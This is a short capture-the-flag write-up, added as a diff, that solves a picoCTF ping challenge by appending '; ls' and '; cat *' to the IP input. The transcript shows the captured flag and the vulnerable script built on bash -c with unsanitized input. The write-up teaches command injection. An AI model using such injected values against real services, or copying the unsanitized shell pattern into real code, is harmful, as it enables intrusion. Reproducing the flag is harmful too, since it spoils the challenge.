@@ -1,0 +1,32 @@
+When we connect to the server we see that we can actually ping many different ips. The output of the command appears like it's fed directly into the `ping` command without sanitization.
+
+Assuming that the user input isn't sanitized and that it's directly fed into bash, we can use this opportunity to
+run arbitrary commands by adding a ; to our query.
+
+```
+> nc mysterious-sea.picoctf.net 61531
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; ls
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=10.6 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=10.6 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 10.633/10.634/10.635/0.001 ms
+flag.txt
+script.sh
+
+> nc mysterious-sea.picoctf.net 61531
+Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8; cat *
+PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
+64 bytes from 8.8.8.8: icmp_seq=1 ttl=111 time=9.70 ms
+64 bytes from 8.8.8.8: icmp_seq=2 ttl=111 time=9.63 ms
+
+--- 8.8.8.8 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 9.632/9.664/9.697/0.032 ms
+picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_ddce97d3}#!/bin/bash
+echo -n "Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): "
+read domain
+bash -c "ping -c2 $domain"
+```
